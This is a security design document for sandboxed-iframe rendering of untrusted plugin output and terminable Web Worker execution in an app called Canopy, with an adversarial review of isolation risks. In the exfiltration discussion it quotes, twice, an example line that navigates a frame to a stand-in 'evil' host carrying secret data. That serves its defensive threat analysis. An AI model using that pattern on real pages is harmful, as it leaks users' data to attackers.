# Design: Tier-2 sandboxed-iframe rendering + terminable execution

## Context

Tier-1 (`content-rendering-plugin`, canopy-586, on main) resolves a `rendererKind: 'wasm'` renderer, runs it through `executeSandboxedGuestPlugin`, validates a `{ html }` envelope, and mounts the sanitized HTML in a closed Declarative Shadow DOM (`apps/web/src/components/renderers/execute-wasm-render.ts`, `wasm-rendered-block.tsx`, `sanitize-html.ts`). Its design.md closed with two named residual risks and a `Residual accepted risks` section that explicitly folds their fixes into "Change B" — this change.

Two independent gaps remain, and they are genuinely orthogonal:

1. **Execution is not terminable.** `executeSandboxedGuestPlugin` (`packages/api-adapter/src/wasm/sandboxed-executor.ts`) bounds a guest with `Promise.race([execution, setTimeout])` (`DEFAULT_WASM_TIMEOUT_MS = 5000`) plus a fuel meter (`DEFAULT_WASM_FUEL_LIMIT`) that only debits host-import calls. A guest whose exported render function runs a synchronous compute loop never yields, so the timer callback never runs and the fuel meter never advances — the main thread hangs. This is an execution-boundary problem and it applies to **any** untrusted guest, Tier-1 or Tier-2.
2. **There is no origin isolation for output.** The closed shadow DOM contains CSS and DOM clobbering but not script execution; a DOMPurify bypass is a full host XSS, and a renderer that legitimately needs live JS cannot be expressed. This is an output-rendering problem, solved only by a real origin boundary.

A live-JS renderer needs both fixes: its render computation must be terminable **and** its live output must run walled off. The safety model for both is settled in [docs/research/2026-08-14-safe-rendering-untrusted-plugin-output.md](../../../docs/research/2026-08-14-safe-rendering-untrusted-plugin-output.md); this design implements its Tier-2 sections. It also resolves canopy-7dj — the `canopy:ui/render` HTML-output interface (`docs/design/2026-02-08-extension-and-execution-model.md`, draft, never security-reviewed).

There is **no consuming renderer yet.** No first-party plugin declares `render:interactive`; per [constrain speculative design] the deliverable is the engine plus one minimal harness/e2e proof that exercises it, not a production interactive renderer built speculatively.

## Decisions

1. **Two capabilities, one change, because they compose but do not overlap.** `terminable-plugin-execution` (worker transport) and `sandboxed-iframe-rendering` (Tier-2 output engine) ship together because an interactive renderer needs both, but they are separately specified and separately testable. Terminable execution is reusable by a future untrusted _Tier-1_ renderer too.

2. **Capability selects tier, but a distinct grant authorizes it (adversarial review finding 5).** A plugin declaring `render:raw-html` stays Tier-1 (scripts stripped, sanitized-inline); a plugin declaring the **new** `render:interactive` routes to Tier-2 (scripts preserved, opaque-origin iframe). The capability _is_ the request for the elevated privilege (script survival) — no new RendererDefinition property, no output-envelope self-declaration (a plugin must not talk its way from Tier-1 into Tier-2 at runtime). But **manifest declaration alone must not be the gate**: today the only grant is a single global `SYSTEM_RENDER_GRANT = 'render:raw-html'` (`execute-wasm-render.ts`), and `defaultCapabilityValidator` treats a `render:*` or `*` grant as covering **any** `render:` capability (`capabilities.ts`). So merely adding `render:interactive` to the vocabulary would retroactively convey Tier-2 to every wildcard-grant holder. Therefore: Tier-2 routing SHALL require an **explicit, non-wildcard `render:interactive` grant** in the granted scope; a `render:*`/`*` grant SHALL NOT auto-convey it. The system render grant for a first-party static renderer stays `render:raw-html` and never routes to Tier-2. The existing Markdown plugin is unaffected: it declares only `render:raw-html`. If both `render:raw-html` and `render:interactive` are effectively granted, the presence of `render:interactive` forces Tier-2 (finding 14).

3. **Terminable execution = Web Worker, mandatory for ALL untrusted render computation including Tier-2's transform (adversarial review finding 2).** Canopy is a web SPA today (Tauri deferred, local-app-delivery ADR). A Web Worker the host can `terminate()` gives real wall-clock termination in the browser with no native dependency; a wasmtime-style native runtime is a Tauri-era option, not built here. There is **no "self-contained renderer skips the worker" escape hatch** — a `render:interactive` guest's HTML-producing transform runs synchronously and a runaway loop there would hang the main thread exactly as at Tier-1, so the tier that carries live scripts is precisely the one that must not run unterminated on the main thread. The worker wraps `executeSandboxedGuestPlugin`; the executor core (fuel/timeout/reentrancy) is not redefined (invariant: the transport does not redefine the executor), but see decision 3a on memory and host imports.

   3a. **Host imports across the worker boundary + a hard memory cap.** The host bindings (`createWasmHostBindings`) are **already `Promise`-returning** (host-bindings.ts), so a guest host-import can be marshaled from the worker back to the main-thread graph over `postMessage` and awaited — this is tractable, not a rewrite of the binding signatures, but it **must be designed here, not deferred**: binding calls become async round-trips serialized over the worker channel, still capability-checked against the bound token on the main thread. Separately, the current `createMemoryChecker` only bounds input/output byte length, not guest linear memory; the worker path SHALL instantiate guest memory with a hard `WebAssembly.Memory({ maximum })` ceiling and use a shorter untrusted-render deadline (well under the 5000 ms Tier-1 default), because `memory.grow` toward 4 GB is synchronous and can OOM the tab before a wall-clock `terminate()` fires (finding 6). The worker bundle SHALL NOT expose the `Worker` constructor, so a guest cannot spawn nested workers that outlive `terminate()` (finding 7).

4. **Isolation boundary = `srcdoc` + `sandbox="allow-scripts"` (no `allow-same-origin`) + `allow=""` + in-document meta-CSP.** Omitting `allow-same-origin` forces an opaque null origin; combining the two would let the frame delete its own `sandbox` and escape. **The iframe also sets `allow=""` (empty Permissions-Policy)** — sandbox flags and Permissions-Policy are orthogonal, and without `allow=""` the frame can inherit camera/mic/geolocation/clipboard/fullscreen/pointer-lock the host document holds (finding 3). CSP is delivered via `<meta http-equiv>` _inside_ the srcdoc (srcdoc inherits the parent CSP otherwise) and pins the **full reference directive set** — `default-src 'none'; connect-src 'none'; object-src 'none'; frame-src 'none'; worker-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'` (`form-action`/`frame-ancestors` have no `default-src` fallback, so they must be listed explicitly; finding 10). Opaque `srcdoc` is the only option that is fully offline, needs no second origin, and needs no service-worker lifecycle; `allow-unique-origin` is unimplemented across engines as of 2026, so opaque frames have **no storage APIs** and the design must not assume any.

   4a. **Network exfiltration is NOT fully closed — reframed as residual (adversarial review finding 1).** `connect-src 'none'` blocks `fetch`/XHR/WebSocket/`sendBeacon`, but it does **not** block the frame navigating its **own** browsing context (`location.href = 'https://evil/?d=' + secret` fires a GET before the parent can react; `navigate-to`/`prefetch-src` are effectively removed from the platform), and WebRTC is a historically-uncovered second channel. So an interactive frame with data in it can exfiltrate. The mitigation is **data minimization, not a CSP claim**: the host SHALL place into a Tier-2 frame only the content the plugin strictly needs to render (never broad graph/query data the plugin did not request), and MAY detect+tear down on unexpected top-level frame navigation. Residual exfiltration for whatever data the frame legitimately holds is **accepted** and documented, not claimed closed.

5. **Bridge never touches host DOM from frame messages; nonce is bidirectional and identity-checked.** Opaque frames all report `event.origin === "null"`, so origin cannot authenticate a message. Each frame gets a cryptographic `instanceNonce`; **both** inbound (frame→host) **and** outbound (host→frame) messages carry and are matched by the nonce (a stale host→frame message for a recycled frame is rejected frame-side, finding 8), inbound messages are validated against a strict Zod schema (`.strict()`, drop on mismatch — which also neutralizes `__proto__`-key pollution), **bounded in serialized size** (a single oversized payload is structured-cloned into host memory before Zod runs and can OOM regardless of rate, finding 9), rate-limited by frequency, and dispatched through a fixed indirect handler exposing only an enumerated action set. The host also asserts `event.source === frame.contentWindow` (always available for a self-created frame — a hard requirement, not hedged; finding 15). The host **never** sets a host DOM attribute/property from message content — the exact Logseq escape (report cites CVE-2026-47901; unverified, cited as design rationale not fact per [audit upstream phrasing]).

6. **Virtualized recycled frame pool, never per-block; recycling clears browsing-context state (adversarial review finding 4).** ~2–5 MB/frame → >1.5 GB at 300 blocks, plus broken cross-frame text selection and a screen-reader region per block. A bounded pool (~10–15) of in-viewport live frames; off-screen interactive blocks show a static preview (a poster image or the plugin's static-fallback HTML rendered Tier-1, decided during build against a real renderer). Recycling is **not** a bare `srcdoc` swap: `window.name`, `history.length`, and other browsing-context-scoped state survive a same-element navigation and would leak block A's data to block B, and the host cannot clear `contentWindow.name` cross-origin. So recycle SHALL either destroy and recreate the `<iframe>` element, or reset the element's `name` attribute to a fresh random value **before** assigning the new `srcdoc`; and it rotates the `instanceNonce`.

7. **`render:interactive` output contract stays a raw-HTML string (canopy-7dj answer).** The `canopy:ui/render` interface returns HTML, not a restructured declarative AST. The security answer is _isolation_, not _constraint_: the raw HTML is loaded as the frame's `srcdoc` and never reaches the host realm. The constraint path (`render:declarative`) remains a separate, still-unimplemented capability for host-catalog rendering; this change does not build it.

8. **Tauri hardening = no reachable IPC surface, not just `withGlobalTauri: false` (adversarial review finding 12).** `withGlobalTauri: false` only drops the convenience `window.__TAURI__` wrapper; Tauri v2 IPC is also reachable via `window.__TAURI_INTERNALS__.postMessage`, the `ipc://`/custom-protocol path, and init scripts whose subframe-injection scope is config-dependent. The invariant is therefore: **no Tauri IPC surface (`__TAURI__`, `__TAURI_INTERNALS__`, `window.ipc`, custom-protocol handlers) is reachable from a render frame, and init scripts are not injected into untrusted subframes.** Since Tauri is not yet wired, this lands as a documented required-config invariant + a guard/test asserting the internals object (not only `__TAURI__`) is absent, not a running integration.

9. **A live Tier-2 frame carries a persistent "sandboxed plugin" affordance (adversarial review finding 11).** Confinement to the frame rect stops overlay of host chrome, but a plugin can still render convincing fake host UI _inside_ its box (a fake credential/confirm prompt) and capture keystrokes. Tier-2 frames SHALL carry a persistent visual affordance (border/badge) distinguishing untrusted plugin output from host UI; clipboard capture is denied by `allow=""` (decision 4). In-frame phishing is otherwise a documented residual for interactive plugins.

## Integration points

- **Capability vocabulary** (`packages/api-adapter/src/wasm/capabilities.ts` + the `packages/graph` leaf-side duplicate): add `render:interactive` to both `WasmCapability` and `KNOWN_WASM_CAPABILITIES`; the cross-package sync guard (canopy-3xr, `packages/api-adapter` test) already exists and must stay green.
- **Worker transport** (`packages/api-adapter` or `apps/web`): a `executeSandboxedGuestPluginInWorker(...)`-shaped wrapper that posts the execution request into a Worker, `terminate()`s on a wall-clock deadline (shorter than the Tier-1 5000 ms default), and returns the same `Result<string, ApiAdapterError>` shape. The worker entry imports the transpiled guest and calls the existing executor; it instantiates guest `WebAssembly.Memory` with a hard `maximum`, does not expose the `Worker` constructor, and marshals any `Promise`-returning host-binding call back to the main-thread graph over the worker channel (still token-checked main-side). Mandatory for all untrusted render computation, Tier-1 and Tier-2 (decisions 3, 3a). Placement decided at build time by where the executor's imports resolve without pulling Node bindings into the worker bundle.
- **Tier-2 render engine** (`apps/web/src/components/renderers/`): a frame-pool manager (element-recreate/`name`-reset on recycle), a `srcdoc` + full-directive meta-CSP + `allow=""` document builder, the bidirectional nonce bridge with size-bounded Zod message schemas, and a `Tier2RenderedBlock` component (with the sandboxed-plugin affordance) paralleling `WasmRenderedBlock`. The resolver in `block-renderer.tsx` gains a tier branch keyed off the resolved+granted capability.
- **Render tier selection** (`execute-wasm-render.ts` / registry): route to Tier-2 only when the **effective granted** scope contains a non-wildcard `render:interactive` (decision 2), else Tier-1. `intersectCapabilities` still caps the effective token; the system render grant stays `render:raw-html`.
- **Tauri config**: `withGlobalTauri: false` recorded as a required setting for untrusted render webviews; a unit/e2e guard asserts `window.__TAURI__` is absent in a render frame.
- **canopy-7dj doc resolution** (`docs/design/2026-02-08-extension-and-execution-model.md`): add the security-review outcome (isolation-not-restructure) referencing this change.

## Adversarial review and mitigations

### Resource and performance overhead

- **Worker spin-up per render.** Creating a Worker and instantiating a 12.5 MB component per render is far heavier than a main-thread call.
  _Mitigation:_ pool and reuse workers across renders (a small warm pool), instantiate the component once per worker and reuse it; key results in the existing bounded-LRU render cache (by node id + content hash) so repeats are free. A terminated worker is discarded and replaced, never reused (decision 3 / spec: no poisoned state). Add the worker path to the existing render benchmark (`apps/web/scripts/bench-wasm-render.ts`) so spin-up and steady-state cost are measured, not assumed.
- **Iframe memory (the per-block trap).** Per the research report, per-block frames reach >1.5 GB at 300 blocks.
  _Mitigation:_ the virtualized pool (decision 6) is a hard requirement in the spec, not an optimization; simultaneously-live frames are bounded regardless of document length; off-screen blocks hold no live frame.
- **Double cost for interactive blocks (worker + frame).** An interactive renderer pays worker execution _and_ a live frame.
  _Mitigation:_ this is the intrinsic cost of untrusted live output and is opt-in per capability; Tier-1 renderers (the common case) pay neither. The frame pool + worker pool bound the aggregate. The worker is **not** skippable for a "self-contained" renderer (decision 3, finding 2): the HTML-producing transform runs synchronously and must be terminable regardless of where its _output_ later runs, so the tier that carries live scripts is exactly the one that must go through the worker.
- **Selection / accessibility fragmentation.** Live frames break cross-block text selection and give each block its own a11y region.
  _Mitigation:_ off-screen static previews are real DOM (selectable, in the a11y tree); only in-viewport interactive frames are opaque, matching the research recommendation. Accept that a live interactive block is its own a11y region — that is inherent to sandboxed interactive content.

### Failure modes and edge cases

- **Synchronous-runaway guest (the headline gap).** A guest render loop that never yields.
  _Mitigation:_ this is precisely what the worker transport fixes — the host's wall-clock timer runs on the _main_ thread and calls `worker.terminate()` regardless of whether the guest yields; resolves as a bounded timeout error → fallback (spec: `terminable-plugin-execution`).
- **Memory-bomb before the deadline (finding 6).** `memory.grow` toward 4 GB is synchronous and can OOM the tab before the wall-clock `terminate()` fires.
  _Mitigation:_ guest memory is instantiated with a hard `WebAssembly.Memory({ maximum })` ceiling and the untrusted-render deadline is shorter than the 5000 ms Tier-1 default (decision 3a); the "memory guard" wording in the spec is not overstated beyond what this actually enforces.
- **Guest-spawned nested workers surviving terminate (finding 7).** `worker.terminate()` on child workers has been unreliable across engines; orphaned children keep burning CPU.
  _Mitigation:_ the worker bundle does not expose the `Worker` constructor, so a guest cannot spawn nested workers (decision 3a); a test asserts a guest cannot outlive terminate via a child worker.
- **Worker that fails to spawn / CSP blocks the worker.** Worker construction can throw (bundling, CSP `worker-src`).
  _Mitigation:_ treat as a non-fatal execution error → native/property fallback, logged once; the app CSP must allow the worker script origin (host-app CSP, distinct from the frame's inner `worker-src 'none'`).
- **Frame that never signals ready / hangs loading.** A srcdoc that never posts its ready handshake.
  _Mitigation:_ the host applies a mount deadline; on expiry it tears down the frame (returns it to the pool) and shows the static preview; no host state waits unbounded on a frame.
- **Message flooding / bridge abuse.** A frame emitting messages in a tight loop.
  _Mitigation:_ per-frame rate limit (spec) drops/throttles excess; messages failing Zod `.strict()` or nonce match are dropped before dispatch; the indirect handler exposes only an enumerated action set.
- **Nonce leakage between recycled frames.** Reusing a frame for a new block could let stale messages act on the new context.
  _Mitigation:_ recycling **rotates the nonce**; messages carrying the previous nonce no longer match and are dropped; the frame document is fully replaced (new srcdoc) on reuse, not mutated in place.
- **Malformed interactive output.** Output that is not a string / not loadable as srcdoc.
  _Mitigation:_ validate the output envelope (Zod) at the host boundary exactly as Tier-1 does; on failure, fall back, never mount.
- **Stale/racing render.** Content changes while a Tier-2 render is in flight.
  _Mitigation:_ reuse Tier-1's keyed-by-(node id, content hash) discipline; a late result for a superseded key is discarded; a superseded frame is returned to the pool.

### Security and isolation

- **Sandbox escape via `allow-same-origin` + `allow-scripts`.** The classic combination lets a frame remove its own sandbox and reach the parent.
  _Mitigation:_ `allow-same-origin` is omitted (decision 4); the opaque origin has no path to the host origin; a lint/test asserts the sandbox token list never contains it.
- **CSP inheritance defeat.** A srcdoc frame inherits the parent CSP, so an outer policy could be weaker/stronger than intended.
  _Mitigation:_ CSP is set via in-document `<meta http-equiv>` (decision 4) pinning the full directive set including `worker-src 'none'`, `form-action 'none'`, `frame-ancestors 'none'` (no `default-src` fallback for the latter two); `default-src 'none'` denies everything not explicitly allowed; `frame-src 'none'`/`object-src 'none'` block nested-frame and plugin escalation.
- **Network exfiltration is not closed by `connect-src` (corrected by independent review, finding 1).** `connect-src 'none'` blocks `fetch`/XHR/WebSocket/`sendBeacon` but **not** self-navigation (`location.href = 'https://evil/?d=' + secret` sends a GET before the parent reacts) or WebRTC.
  _Mitigation:_ **data minimization**, not a CSP claim — the host places only strictly-needed content into a Tier-2 frame and never broad graph/query data the plugin did not request (decision 4a), MAY tear down on unexpected top-level navigation, and documents residual exfiltration of whatever the frame legitimately holds as **accepted**. This is the corrected version of the research doc's overstated "connect-src closes exfiltration."
- **Permissions-Policy inheritance (finding 3).** Sandbox flags do not gate camera/mic/geolocation/clipboard/fullscreen/pointer-lock — Permissions-Policy does, and without `allow=""` the frame can inherit features the host holds.
  _Mitigation:_ the iframe sets `allow=""` (decision 4); a test asserts the `allow` attribute is empty, paralleling the `allow-same-origin`-absent test.
- **Browsing-context state leak across recycled frames (finding 4).** `window.name`/`history` survive a same-element `srcdoc` swap and the host cannot clear `contentWindow.name` cross-origin.
  _Mitigation:_ recycle recreates the `<iframe>` element or resets its `name` attribute before the new `srcdoc`, and rotates the nonce (decision 6).
- **Host-attribute DOM-clobbering escape (the Logseq class).** Host applying frame-supplied attributes.
  _Mitigation:_ structurally excluded — the host never writes a DOM attribute/property from a frame message (decision 5); only an enumerated indirect handler runs, and only on nonce+schema-valid messages.
- **Origin spoofing on `postMessage`.** Every opaque frame reports `origin === "null"`, so origin cannot authenticate.
  _Mitigation:_ authentication is by unguessable per-frame nonce, not origin; the host **also** asserts `event.source === frame.contentWindow` (always available for a self-created frame — a hard requirement, finding 15); unmatched messages are dropped. Outbound host→frame messages carry the nonce too, so a stale message to a recycled frame is rejected frame-side (finding 8).
- **Host memory OOM via oversized message (finding 9).** A single huge `postMessage` payload is structured-cloned into host memory before Zod runs; a frequency rate-limit does not catch it.
  _Mitigation:_ a max serialized-message-size bound drops oversized messages at/before clone (decision 5).
- **Native-bridge exposure under Tauri.** Tauri IPC reaching untrusted output.
  _Mitigation:_ not just `withGlobalTauri: false` — the invariant is no reachable IPC surface (`__TAURI__`, `__TAURI_INTERNALS__`, `window.ipc`, custom-protocol handlers) and no init-script injection into untrusted subframes (decision 8); the guard asserts the internals object is absent, not only the convenience global.
- **Capability over-grant / Tier-1→Tier-2 self-elevation (strengthened by finding 5).** A plugin reaching interactive privilege it wasn't granted, or a wildcard grant silently conveying it.
  _Mitigation:_ tier is chosen from the **effective granted** scope, not runtime output; a Tier-1 plugin has no code path to Tier-2; Tier-2 requires an explicit **non-wildcard** `render:interactive` grant, and `render:*`/`*` grants do **not** auto-convey it (decision 2), so adding the vocabulary value cannot retroactively hand Tier-2 to existing wildcard-grant holders. A regression test asserts a `render:*` grant does not route to Tier-2.
- **In-frame phishing (finding 11).** A plugin renders fake host UI inside its frame rect and captures keystrokes.
  _Mitigation:_ a persistent "sandboxed plugin" visual affordance on Tier-2 frames (decision 9); clipboard capture denied by `allow=""`; residual in-frame deception documented.
- **Trusting the transpiled guest inside the worker.** The worker still runs jco-transpiled guest code.
  _Mitigation:_ the worker only _executes_; its output is still validated + (for Tier-1) sanitized on the host; for Tier-2 the output is confined to the opaque frame. The worker boundary adds terminability, it does not by itself sanitize output.

### Migration and backward compatibility

- **Existing Tier-1 renderers must be untouched.** The Markdown plugin declares `render:raw-html` only.
  _Mitigation:_ tier selection defaults to Tier-1 for everything not declaring `render:interactive`; `WasmRenderedBlock`/`sanitize-html` are unchanged; a regression e2e keeps the Markdown path green.
- **Capability vocabulary sync.** `render:interactive` must land in both `packages/api-adapter` and the `packages/graph` duplicate.
  _Mitigation:_ add to both; the existing cross-package sync guard (canopy-3xr) fails CI if they drift.
- **No persisted data-model change.** Tier selection rides existing capability strings; no new node type, no bootstrap node-count change unless a demo/harness plugin is seeded (kept out of the kernel if so, like the Markdown placeholder).
  _Mitigation:_ if a harness plugin is seeded for the e2e, follow the canopy-586 precedent (empty `wasm_binary` placeholder, app-bundled transpiled artifact) and update the bootstrap node-count tests.
- **Spec drift.** `view-rendering`, `content-rendering-plugin`, `wasm-capability-manifest-enforcement` deltas.
  _Mitigation:_ deltas included; specs sync on archive.

## Residual accepted risks

- **Network exfiltration of in-frame data (finding 1).** A Tier-2 frame can exfiltrate whatever data it legitimately holds via self-navigation or WebRTC; `connect-src 'none'` does not close this. Accepted, bounded by data minimization (decision 4a) — the host places only strictly-needed content into the frame. This is why Tier-2 is opt-in and grant-gated, not a default.
- **In-frame phishing (finding 11).** A live interactive frame can render deceptive UI inside its rect. Accepted, mitigated by the persistent sandboxed-plugin affordance (decision 9).
- **jco-transpiled execution is still the execution engine.** The worker adds _terminability_, not a stronger-than-WebAssembly isolation model; the guest's memory/global isolation is still WebAssembly's. Accepted: this is the strongest terminable option in a pure-web target; a native wasmtime runtime is a Tauri-era upgrade, tracked separately, not blocking.
- **Static preview fidelity.** An off-screen interactive block shows a non-live preview, so live state is not visible until it scrolls in. Accepted as the cost of not holding hundreds of live frames.
- **A11y for live interactive blocks.** A live opaque frame is its own a11y region and cannot be merged into the host accessibility tree. Accepted as inherent to sandboxed interactive content; the static preview (real DOM) covers the off-screen case.
- **SAB/COEP timing (finding 13).** If the worker opts into `SharedArrayBuffer` via cross-origin isolation, that also re-enables SAB and finer timers inside the sandboxed frame, strengthening Spectre timing primitives there. Low-impact under site isolation; noted so an SAB opt-in is a conscious choice.

## Independent adversarial review outcome

An independent Security Architect (Opus) pass reviewed this design against the research doc and current code. Verdict: **approvable-with-revisions**; all six must-fix items are folded in above — findings 1 (exfil reframe, decision 4a), 2 (no worker-skip escape hatch, decisions 3/3a), 3 (`allow=""`, decision 4), 4 (browsing-context state on recycle, decision 6), 5 (grant gate + wildcard non-conveyance, decision 2), 6+9 (memory + message-size caps, decisions 3a/5). Spec-tightening findings 7/8/10/11/12 are folded into decisions 3a/5/4/9/8; minor 13/14/15 noted. One reviewer justification was corrected on verification: host bindings are **already `Promise`-returning** (not synchronous as the review stated), so the worker host-import transport is a marshaling change, not a binding-signature rewrite (decision 3a).

## Open questions to settle at implementation (not blockers)

- Where the worker transport lives (`packages/api-adapter` vs `apps/web`) — decided by which placement keeps Node bindings out of the worker bundle.
- The exact static-preview representation (poster vs Tier-1 static-fallback HTML) — settled against a real renderer's output.
- Whether a minimal first-party `render:interactive` demo plugin ships as the e2e vehicle, or the engine is proven with a fixture guest only — leaning fixture-only to avoid speculative product surface.
